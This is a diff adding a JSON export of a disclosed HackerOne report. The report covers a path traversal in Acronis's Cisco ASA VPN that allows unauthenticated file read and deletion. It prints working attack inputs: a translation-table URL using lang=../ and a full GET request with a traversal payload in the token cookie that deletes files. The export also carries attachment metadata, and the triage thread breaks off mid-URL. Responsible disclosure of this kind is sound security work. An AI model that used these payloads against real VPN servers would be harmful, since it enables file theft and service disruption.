@@ -1,0 +1,1667 @@
+{
+    "id": 924407,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MjQ0MDc=",
+    "url": "https://hackerone.com/reports/924407",
+    "title": "Local File Disclosure /Delete On [us-az-vpn.acronis.com]",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "medium",
+    "readable_substate": "Resolved",
+    "created_at": "2020-07-15T13:01:14.953Z",
+    "submitted_at": "2020-07-15T13:01:14.953Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "10nf",
+        "url": "/10nf",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/J1tXDaUQ2vAnWyACoRJzaQ9D/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": true,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 13428,
+        "url": "https://hackerone.com/acronis",
+        "handle": "acronis",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Acronis",
+            "twitter_handle": "Acronis",
+            "website": "https://www.acronis.com",
+            "about": "Acronis sets the standard for cyber protection through its backup, anti-ransomware and cyber infrastructure"
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2021-06-22T14:47:39.234Z",
+    "bug_reporter_agreed_on_going_public_at": "2021-06-22T14:47:39.138Z",
+    "team_member_agreed_on_going_public_at": "2021-06-22T06:38:09.794Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "Cisco ASA VPN server hosted on\n\n* https://us-az-vpn.acronis.com\n\n\nwas found to be using an outdated version that suffers from a Local File Disclosure /Delete vulnerability. Through this vulnerability an unauthenticated remote attacker can read and delete the contents of any file stored on the VPN server without authentication; including the VPN \"lua\" source code files .\nThis vulnerability can delete any file and break the vpn , so it should be carefully tested\nThe files will be restored after VPN restart\n\n\n##Technical details:\n### Affected Endpoint for delete :\n\n* https://us-az-vpn.acronis.com/+CSCOE+/session_password.html\n\n\n```Affected Cookie Parameter: token```\n```Request Method: GET```\n\n### Affected Endpoint for read files:\n\n* https://us-az-vpn.acronis.com/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../\n\n```Affected Cookie Parameter: textdomain```\n```Request Method: GET```\n{F908308}\n\n\nThis vulnerability is critical and can't be tested on production environment as it will break the VPN by deleting any file , so I tested on local environment .\n\nWe need to verify that the vulnerability exists :\n\n* Firstly I downloaded the vulnerable code and compared it with the code from local environment , and they were identical\n{F908308}\n* Secondly, When this path exists +CSCOE+/session_password.html this means the vulnerability isn't patched , and if the response is 404 that means the vulnerability is patched\n\n{F908309}\n\n# Exploiting the vulnerability on local environment :\n* Trying to download a file :\n```\nhttps://192.168.1.100/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/wrong_url.html&default-language&lang=../\n```\n{F908307}\n\n* Exploit the vulnerability using this request :\n```\nGET /+CSCOE+/session_password.html HTTP/1.1\nHost: 192.168.1.100\nConnection: close\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: cross-site\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nCookie: token=../../../../../../+CSCOE+/wrong_url.html\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n```\n\nThe file is read and stored in webvpn cookie and then deleted \n{F908305}\n\n* Trying to read the file again after delete :\n\n```\nhttps://192.168.1.100/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/wrong_url.html&default-language&lang=../\n```\n\n{F908306}\n\n## Impact\n\nThe vulnerability allows a remote unauthenticated attacker to read and download files from Cisco ASA VPN server, thus an attacker can use the vulnerability to read and delete internal files from the server such as:\n\n* The VPN's LUA source code files\n* Delete any file\n* Break the vpn web portal\n* Prevent users from authenticate via web portal",
+    "weakness": {
+        "id": 19,
+        "name": "Path Traversal"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 908305,
+            "file_name": "delete_file.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iVVeKvqDGymXqUhahs5diSYm?response-content-disposition=attachment%3B%20filename%3D%22delete_file.png%22%3B%20filename%2A%3DUTF-8%27%27delete_file.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2A32MPNM%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070958Z&X-Amz-Expires=1178&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBsEOMwacgmpJyapiLJobGs%2Bgcg9PNH4EriOGZo98SE4AiEAt90x4AmgjAq2rIIH1y%2FzssW%2FAhnA8Qye1rVHIwJcexEquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBZa1%2FijtCdkdWImhiqPBWGkbtglINv7ypiNIiDYHjrdejYg0wtRl1gT6H0PEyTqGrM6uy7I1J9pNolUh5DffZcgFrPdxwVNxSgsTu4Dj40wjGn2o9qh0BWf4wO5PC%2FYnaaINUtHD0xSUrDCYd16Bo5kaybIxr7xuCItkaUqHeQAu8kGJCQziBsdAr7Ncgc7rh1cBX9EUoKfwpb6OQ0HEPiMYEaf15OVnHiyT1pdUGvbm2Ri8lcoQ7H%2BbeHuFYZkjkH1CR6lUBJfaEhXwMAzp8%2BdinRLj0MTXlU%2F0K1uC7FV4lfRXCvof5wj8m%2BdFNOY%2FthnIrNYj3jQHeMKtCjVez%2FPIpgLd7nMJtBfOKxN%2BA0nuGzrxka0k7Rm3FByYnZe1yMdUDoALpRS1KQuscu5o8jxv0Xa%2BWhozCbPKylMyYNMcIFQm9bmH0GD%2BF%2BIcbbwuskYTIRvRxUYWR%2BgcWc1hXxNXTpVJ1tDlstc4Fw%2BoWtBUiF4MO151WqX1lU6qkcZIB8bIW4LnN1AO%2F3KMQ0cNeVnUjADVXklvgxLHqHVI2%2FxX9F%2Bc7F4jWUlJwMYR4CtnV0lSDOcdsIRAoGm5Dlyu%2BGBHm0E9szzmRe9yTWOQiEbr%2BsaTRhFxzqWr8ue0nEqkZ6ZAmTO1RTlcHTMNZdZS1MPLZdjwthAiae%2FphhQstkxtEKrCfGhMvRS52DKOEvECIcuIeOq8cIkOxFyNXc9ghGN1FFQxpLJKFZmD4hbFCVRZtgrlDVeavSklNmOzLRY1WHQumcB2YvsmGv58jHnm%2FZe51zoKP9U7vpSOyrsjh3OwYQ%2BzuI6rItbcKFQZSLbL4MtcMyHxofT2sx2bl8dQq5UuHZC%2BP1%2Fu3Duhe8K10o7d70jxWXWKkX%2FXCauJlAw7I61pwY6sQG89C08plQG1A6gbdPziJfOcb%2FyZBW3%2BFOpsmNUBJJz3pouKGhoBruTYKmcGNvl6gFBH0kQi6IZr17jMNNb7ofmrjeAKtToIfjLsJlJLkkc7%2FqqGuQ3tX3bnAtE44qHhnRbqFGRQ6BzWEATYPS0L1E%2B6hcCCpz2xmeIirlvlGQbF7UW%2B7O5YFNrzbtwLsHw5D8Y8q%2B15ASZwGa7kp0s8X4M%2FlVGTpWEwtSD6XlV0stRL1o%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d9974c202b61e1bb08c0df358d73774c467b82e29cc178fac85763231fc9cc8e",
+            "file_size": 49719,
+            "type": "image/png"
+        },
+        {
+            "id": 908306,
+            "file_name": "file_after_delete.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/FSQiBHfWSt6JyWWiCRDybwY6?response-content-disposition=attachment%3B%20filename%3D%22file_after_delete.png%22%3B%20filename%2A%3DUTF-8%27%27file_after_delete.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2A32MPNM%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070958Z&X-Amz-Expires=1178&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBsEOMwacgmpJyapiLJobGs%2Bgcg9PNH4EriOGZo98SE4AiEAt90x4AmgjAq2rIIH1y%2FzssW%2FAhnA8Qye1rVHIwJcexEquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBZa1%2FijtCdkdWImhiqPBWGkbtglINv7ypiNIiDYHjrdejYg0wtRl1gT6H0PEyTqGrM6uy7I1J9pNolUh5DffZcgFrPdxwVNxSgsTu4Dj40wjGn2o9qh0BWf4wO5PC%2FYnaaINUtHD0xSUrDCYd16Bo5kaybIxr7xuCItkaUqHeQAu8kGJCQziBsdAr7Ncgc7rh1cBX9EUoKfwpb6OQ0HEPiMYEaf15OVnHiyT1pdUGvbm2Ri8lcoQ7H%2BbeHuFYZkjkH1CR6lUBJfaEhXwMAzp8%2BdinRLj0MTXlU%2F0K1uC7FV4lfRXCvof5wj8m%2BdFNOY%2FthnIrNYj3jQHeMKtCjVez%2FPIpgLd7nMJtBfOKxN%2BA0nuGzrxka0k7Rm3FByYnZe1yMdUDoALpRS1KQuscu5o8jxv0Xa%2BWhozCbPKylMyYNMcIFQm9bmH0GD%2BF%2BIcbbwuskYTIRvRxUYWR%2BgcWc1hXxNXTpVJ1tDlstc4Fw%2BoWtBUiF4MO151WqX1lU6qkcZIB8bIW4LnN1AO%2F3KMQ0cNeVnUjADVXklvgxLHqHVI2%2FxX9F%2Bc7F4jWUlJwMYR4CtnV0lSDOcdsIRAoGm5Dlyu%2BGBHm0E9szzmRe9yTWOQiEbr%2BsaTRhFxzqWr8ue0nEqkZ6ZAmTO1RTlcHTMNZdZS1MPLZdjwthAiae%2FphhQstkxtEKrCfGhMvRS52DKOEvECIcuIeOq8cIkOxFyNXc9ghGN1FFQxpLJKFZmD4hbFCVRZtgrlDVeavSklNmOzLRY1WHQumcB2YvsmGv58jHnm%2FZe51zoKP9U7vpSOyrsjh3OwYQ%2BzuI6rItbcKFQZSLbL4MtcMyHxofT2sx2bl8dQq5UuHZC%2BP1%2Fu3Duhe8K10o7d70jxWXWKkX%2FXCauJlAw7I61pwY6sQG89C08plQG1A6gbdPziJfOcb%2FyZBW3%2BFOpsmNUBJJz3pouKGhoBruTYKmcGNvl6gFBH0kQi6IZr17jMNNb7ofmrjeAKtToIfjLsJlJLkkc7%2FqqGuQ3tX3bnAtE44qHhnRbqFGRQ6BzWEATYPS0L1E%2B6hcCCpz2xmeIirlvlGQbF7UW%2B7O5YFNrzbtwLsHw5D8Y8q%2B15ASZwGa7kp0s8X4M%2FlVGTpWEwtSD6XlV0stRL1o%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=857f08a5f893007cc2a774238b69b451e307a0d968665933779b91e8789b34b8",
+            "file_size": 51345,
+            "type": "image/png"
+        },
+        {
+            "id": 908307,
+            "file_name": "file_before_delete.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cwSsq37r6aUKcGSLofGSSf4z?response-content-disposition=attachment%3B%20filename%3D%22file_before_delete.png%22%3B%20filename%2A%3DUTF-8%27%27file_before_delete.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2A32MPNM%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070958Z&X-Amz-Expires=1178&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBsEOMwacgmpJyapiLJobGs%2Bgcg9PNH4EriOGZo98SE4AiEAt90x4AmgjAq2rIIH1y%2FzssW%2FAhnA8Qye1rVHIwJcexEquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBZa1%2FijtCdkdWImhiqPBWGkbtglINv7ypiNIiDYHjrdejYg0wtRl1gT6H0PEyTqGrM6uy7I1J9pNolUh5DffZcgFrPdxwVNxSgsTu4Dj40wjGn2o9qh0BWf4wO5PC%2FYnaaINUtHD0xSUrDCYd16Bo5kaybIxr7xuCItkaUqHeQAu8kGJCQziBsdAr7Ncgc7rh1cBX9EUoKfwpb6OQ0HEPiMYEaf15OVnHiyT1pdUGvbm2Ri8lcoQ7H%2BbeHuFYZkjkH1CR6lUBJfaEhXwMAzp8%2BdinRLj0MTXlU%2F0K1uC7FV4lfRXCvof5wj8m%2BdFNOY%2FthnIrNYj3jQHeMKtCjVez%2FPIpgLd7nMJtBfOKxN%2BA0nuGzrxka0k7Rm3FByYnZe1yMdUDoALpRS1KQuscu5o8jxv0Xa%2BWhozCbPKylMyYNMcIFQm9bmH0GD%2BF%2BIcbbwuskYTIRvRxUYWR%2BgcWc1hXxNXTpVJ1tDlstc4Fw%2BoWtBUiF4MO151WqX1lU6qkcZIB8bIW4LnN1AO%2F3KMQ0cNeVnUjADVXklvgxLHqHVI2%2FxX9F%2Bc7F4jWUlJwMYR4CtnV0lSDOcdsIRAoGm5Dlyu%2BGBHm0E9szzmRe9yTWOQiEbr%2BsaTRhFxzqWr8ue0nEqkZ6ZAmTO1RTlcHTMNZdZS1MPLZdjwthAiae%2FphhQstkxtEKrCfGhMvRS52DKOEvECIcuIeOq8cIkOxFyNXc9ghGN1FFQxpLJKFZmD4hbFCVRZtgrlDVeavSklNmOzLRY1WHQumcB2YvsmGv58jHnm%2FZe51zoKP9U7vpSOyrsjh3OwYQ%2BzuI6rItbcKFQZSLbL4MtcMyHxofT2sx2bl8dQq5UuHZC%2BP1%2Fu3Duhe8K10o7d70jxWXWKkX%2FXCauJlAw7I61pwY6sQG89C08plQG1A6gbdPziJfOcb%2FyZBW3%2BFOpsmNUBJJz3pouKGhoBruTYKmcGNvl6gFBH0kQi6IZr17jMNNb7ofmrjeAKtToIfjLsJlJLkkc7%2FqqGuQ3tX3bnAtE44qHhnRbqFGRQ6BzWEATYPS0L1E%2B6hcCCpz2xmeIirlvlGQbF7UW%2B7O5YFNrzbtwLsHw5D8Y8q%2B15ASZwGa7kp0s8X4M%2FlVGTpWEwtSD6XlV0stRL1o%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7f88f4ca3746e51c5b43d81eba8bacae23e1c1bfcd5fe96b0f7855797d5b888a",
+            "file_size": 59483,
+            "type": "image/png"
+        },
+        {
+            "id": 908308,
+            "file_name": "lfd.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uoz62TbueczNQuJjxBtQYjPU?response-content-disposition=attachment%3B%20filename%3D%22lfd.png%22%3B%20filename%2A%3DUTF-8%27%27lfd.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2A32MPNM%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070958Z&X-Amz-Expires=1178&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBsEOMwacgmpJyapiLJobGs%2Bgcg9PNH4EriOGZo98SE4AiEAt90x4AmgjAq2rIIH1y%2FzssW%2FAhnA8Qye1rVHIwJcexEquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBZa1%2FijtCdkdWImhiqPBWGkbtglINv7ypiNIiDYHjrdejYg0wtRl1gT6H0PEyTqGrM6uy7I1J9pNolUh5DffZcgFrPdxwVNxSgsTu4Dj40wjGn2o9qh0BWf4wO5PC%2FYnaaINUtHD0xSUrDCYd16Bo5kaybIxr7xuCItkaUqHeQAu8kGJCQziBsdAr7Ncgc7rh1cBX9EUoKfwpb6OQ0HEPiMYEaf15OVnHiyT1pdUGvbm2Ri8lcoQ7H%2BbeHuFYZkjkH1CR6lUBJfaEhXwMAzp8%2BdinRLj0MTXlU%2F0K1uC7FV4lfRXCvof5wj8m%2BdFNOY%2FthnIrNYj3jQHeMKtCjVez%2FPIpgLd7nMJtBfOKxN%2BA0nuGzrxka0k7Rm3FByYnZe1yMdUDoALpRS1KQuscu5o8jxv0Xa%2BWhozCbPKylMyYNMcIFQm9bmH0GD%2BF%2BIcbbwuskYTIRvRxUYWR%2BgcWc1hXxNXTpVJ1tDlstc4Fw%2BoWtBUiF4MO151WqX1lU6qkcZIB8bIW4LnN1AO%2F3KMQ0cNeVnUjADVXklvgxLHqHVI2%2FxX9F%2Bc7F4jWUlJwMYR4CtnV0lSDOcdsIRAoGm5Dlyu%2BGBHm0E9szzmRe9yTWOQiEbr%2BsaTRhFxzqWr8ue0nEqkZ6ZAmTO1RTlcHTMNZdZS1MPLZdjwthAiae%2FphhQstkxtEKrCfGhMvRS52DKOEvECIcuIeOq8cIkOxFyNXc9ghGN1FFQxpLJKFZmD4hbFCVRZtgrlDVeavSklNmOzLRY1WHQumcB2YvsmGv58jHnm%2FZe51zoKP9U7vpSOyrsjh3OwYQ%2BzuI6rItbcKFQZSLbL4MtcMyHxofT2sx2bl8dQq5UuHZC%2BP1%2Fu3Duhe8K10o7d70jxWXWKkX%2FXCauJlAw7I61pwY6sQG89C08plQG1A6gbdPziJfOcb%2FyZBW3%2BFOpsmNUBJJz3pouKGhoBruTYKmcGNvl6gFBH0kQi6IZr17jMNNb7ofmrjeAKtToIfjLsJlJLkkc7%2FqqGuQ3tX3bnAtE44qHhnRbqFGRQ6BzWEATYPS0L1E%2B6hcCCpz2xmeIirlvlGQbF7UW%2B7O5YFNrzbtwLsHw5D8Y8q%2B15ASZwGa7kp0s8X4M%2FlVGTpWEwtSD6XlV0stRL1o%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b938878850c783d2aad3e1ef22f56bde89eb771bf19fb66335237b35db66a1e4",
+            "file_size": 126672,
+            "type": "image/png"
+        },
+        {
+            "id": 908309,
+            "file_name": "password.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/CJp2jedRrXMe66yt5Mmdt6hk?response-content-disposition=attachment%3B%20filename%3D%22password.png%22%3B%20filename%2A%3DUTF-8%27%27password.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2A32MPNM%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070958Z&X-Amz-Expires=1178&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBsEOMwacgmpJyapiLJobGs%2Bgcg9PNH4EriOGZo98SE4AiEAt90x4AmgjAq2rIIH1y%2FzssW%2FAhnA8Qye1rVHIwJcexEquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBZa1%2FijtCdkdWImhiqPBWGkbtglINv7ypiNIiDYHjrdejYg0wtRl1gT6H0PEyTqGrM6uy7I1J9pNolUh5DffZcgFrPdxwVNxSgsTu4Dj40wjGn2o9qh0BWf4wO5PC%2FYnaaINUtHD0xSUrDCYd16Bo5kaybIxr7xuCItkaUqHeQAu8kGJCQziBsdAr7Ncgc7rh1cBX9EUoKfwpb6OQ0HEPiMYEaf15OVnHiyT1pdUGvbm2Ri8lcoQ7H%2BbeHuFYZkjkH1CR6lUBJfaEhXwMAzp8%2BdinRLj0MTXlU%2F0K1uC7FV4lfRXCvof5wj8m%2BdFNOY%2FthnIrNYj3jQHeMKtCjVez%2FPIpgLd7nMJtBfOKxN%2BA0nuGzrxka0k7Rm3FByYnZe1yMdUDoALpRS1KQuscu5o8jxv0Xa%2BWhozCbPKylMyYNMcIFQm9bmH0GD%2BF%2BIcbbwuskYTIRvRxUYWR%2BgcWc1hXxNXTpVJ1tDlstc4Fw%2BoWtBUiF4MO151WqX1lU6qkcZIB8bIW4LnN1AO%2F3KMQ0cNeVnUjADVXklvgxLHqHVI2%2FxX9F%2Bc7F4jWUlJwMYR4CtnV0lSDOcdsIRAoGm5Dlyu%2BGBHm0E9szzmRe9yTWOQiEbr%2BsaTRhFxzqWr8ue0nEqkZ6ZAmTO1RTlcHTMNZdZS1MPLZdjwthAiae%2FphhQstkxtEKrCfGhMvRS52DKOEvECIcuIeOq8cIkOxFyNXc9ghGN1FFQxpLJKFZmD4hbFCVRZtgrlDVeavSklNmOzLRY1WHQumcB2YvsmGv58jHnm%2FZe51zoKP9U7vpSOyrsjh3OwYQ%2BzuI6rItbcKFQZSLbL4MtcMyHxofT2sx2bl8dQq5UuHZC%2BP1%2Fu3Duhe8K10o7d70jxWXWKkX%2FXCauJlAw7I61pwY6sQG89C08plQG1A6gbdPziJfOcb%2FyZBW3%2BFOpsmNUBJJz3pouKGhoBruTYKmcGNvl6gFBH0kQi6IZr17jMNNb7ofmrjeAKtToIfjLsJlJLkkc7%2FqqGuQ3tX3bnAtE44qHhnRbqFGRQ6BzWEATYPS0L1E%2B6hcCCpz2xmeIirlvlGQbF7UW%2B7O5YFNrzbtwLsHw5D8Y8q%2B15ASZwGa7kp0s8X4M%2FlVGTpWEwtSD6XlV0stRL1o%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4f6b51e6fa104001de2ee381bd487cb4b6497cf5d071bce6067e2839accaf7e9",
+            "file_size": 82794,
+            "type": "image/png"
+        }
+    ],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 18,
+    "voters": [
+        "cucumbersalad",
+        "omarelfarsaoui",
+        "mr-medi",
+        "quickjohn",
+        "diogourupes",
+        "mrbebo",
+        "sa1tama0",
+        "cryptographer",
+        "vishnuvm123",
+        "hackerrrr11111",
+        "and 8 more..."
+    ],
+    "severity": {
+        "rating": "medium",
+        "author_type": "User"
+    },
+    "structured_scope": {
+        "databaseId": 50773,
+        "asset_type": "WILDCARD",
+        "asset_identifier": "*.acronis.com",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 8611515,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @10nf \n\nThanks for your report! We will review it and get back to you asap",
+            "automated_response": false,
+            "created_at": "2020-07-15T19:24:19.299Z",
+            "updated_at": "2020-07-15T19:24:19.299Z",
+            "actor": {
+                "username": "iradostev",
+                "cleared": false,
+                "verified": false,
+                "url": "/iradostev",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/exz476wuurqsptes5cmn2pgxvf8v/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22iradostev.jpg%22%3B%20filename%2A%3DUTF-8%27%27iradostev.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2A32MPNM%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070959Z&X-Amz-Expires=1177&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBsEOMwacgmpJyapiLJobGs%2Bgcg9PNH4EriOGZo98SE4AiEAt90x4AmgjAq2rIIH1y%2FzssW%2FAhnA8Qye1rVHIwJcexEquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBZa1%2FijtCdkdWImhiqPBWGkbtglINv7ypiNIiDYHjrdejYg0wtRl1gT6H0PEyTqGrM6uy7I1J9pNolUh5DffZcgFrPdxwVNxSgsTu4Dj40wjGn2o9qh0BWf4wO5PC%2FYnaaINUtHD0xSUrDCYd16Bo5kaybIxr7xuCItkaUqHeQAu8kGJCQziBsdAr7Ncgc7rh1cBX9EUoKfwpb6OQ0HEPiMYEaf15OVnHiyT1pdUGvbm2Ri8lcoQ7H%2BbeHuFYZkjkH1CR6lUBJfaEhXwMAzp8%2BdinRLj0MTXlU%2F0K1uC7FV4lfRXCvof5wj8m%2BdFNOY%2FthnIrNYj3jQHeMKtCjVez%2FPIpgLd7nMJtBfOKxN%2BA0nuGzrxka0k7Rm3FByYnZe1yMdUDoALpRS1KQuscu5o8jxv0Xa%2BWhozCbPKylMyYNMcIFQm9bmH0GD%2BF%2BIcbbwuskYTIRvRxUYWR%2BgcWc1hXxNXTpVJ1tDlstc4Fw%2BoWtBUiF4MO151WqX1lU6qkcZIB8bIW4LnN1AO%2F3KMQ0cNeVnUjADVXklvgxLHqHVI2%2FxX9F%2Bc7F4jWUlJwMYR4CtnV0lSDOcdsIRAoGm5Dlyu%2BGBHm0E9szzmRe9yTWOQiEbr%2BsaTRhFxzqWr8ue0nEqkZ6ZAmTO1RTlcHTMNZdZS1MPLZdjwthAiae%2FphhQstkxtEKrCfGhMvRS52DKOEvECIcuIeOq8cIkOxFyNXc9ghGN1FFQxpLJKFZmD4hbFCVRZtgrlDVeavSklNmOzLRY1WHQumcB2YvsmGv58jHnm%2FZe51zoKP9U7vpSOyrsjh3OwYQ%2BzuI6rItbcKFQZSLbL4MtcMyHxofT2sx2bl8dQq5UuHZC%2BP1%2Fu3Duhe8K10o7d70jxWXWKkX%2FXCauJlAw7I61pwY6sQG89C08plQG1A6gbdPziJfOcb%2FyZBW3%2BFOpsmNUBJJz3pouKGhoBruTYKmcGNvl6gFBH0kQi6IZr17jMNNb7ofmrjeAKtToIfjLsJlJLkkc7%2FqqGuQ3tX3bnAtE44qHhnRbqFGRQ6BzWEATYPS0L1E%2B6hcCCpz2xmeIirlvlGQbF7UW%2B7O5YFNrzbtwLsHw5D8Y8q%2B15ASZwGa7kp0s8X4M%2FlVGTpWEwtSD6XlV0stRL1o%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ce70106128130d9e07364da7818758b049a6b52e464e3af67e06e6ab899dc4bf"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 8666090,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-07-21T16:14:09.366Z",
+            "updated_at": "2020-07-21T16:14:09.366Z",
+            "actor": {
+                "username": "iradostev",
+                "cleared": false,
+                "verified": false,
+                "url": "/iradostev",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/exz476wuurqsptes5cmn2pgxvf8v/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22iradostev.jpg%22%3B%20filename%2A%3DUTF-8%27%27iradostev.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2A32MPNM%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070959Z&X-Amz-Expires=1177&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBsEOMwacgmpJyapiLJobGs%2Bgcg9PNH4EriOGZo98SE4AiEAt90x4AmgjAq2rIIH1y%2FzssW%2FAhnA8Qye1rVHIwJcexEquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBZa1%2FijtCdkdWImhiqPBWGkbtglINv7ypiNIiDYHjrdejYg0wtRl1gT6H0PEyTqGrM6uy7I1J9pNolUh5DffZcgFrPdxwVNxSgsTu4Dj40wjGn2o9qh0BWf4wO5PC%2FYnaaINUtHD0xSUrDCYd16Bo5kaybIxr7xuCItkaUqHeQAu8kGJCQziBsdAr7Ncgc7rh1cBX9EUoKfwpb6OQ0HEPiMYEaf15O